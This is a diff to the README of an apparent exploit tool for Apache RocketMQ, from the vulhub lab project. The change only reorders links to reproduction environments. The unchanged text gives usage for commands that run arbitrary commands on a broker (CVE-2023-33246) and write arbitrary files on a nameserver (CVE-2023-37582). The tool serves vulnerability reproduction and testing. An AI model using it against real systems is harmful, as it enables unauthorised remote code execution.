@@ -25,12 +25,12 @@ Download the latest built JAR file from [Releases](https://github.com/vulhub/roc
 
 ### Attack Broker (CVE-2023-33246)
 
+Reproduce environment: [CVE-2023-33246](https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246)
+
 Command-line options:
 
 - `-t, --target`: Target address in host:port format
 - `-c, --cmd`: Command to execute on the target
-
-Reproduce environment: [CVE-2023-33246](https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246)
 
 ```bash
 java -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackBroker --target <host:port> --cmd <command>
@@ -41,13 +41,13 @@ java -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackBroker --target 127.0.0.1:10911
 
 ### Attack Nameserver (CVE-2023-37582)
 
+Reproduce environment: [CVE-2023-37582](https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-37582)
+
 Command-line options:
 
 - `-t, --target`: Target address in host:port format
 - `-f, --file`: Target file path to write
 - `-d, --data`: Content to write into the file
-
-Reproduce environment: [CVE-2023-37582](https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-37582)
 
 ```bash
 java -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackNamesrv --target <host:port> --file <file_path> --data <content>
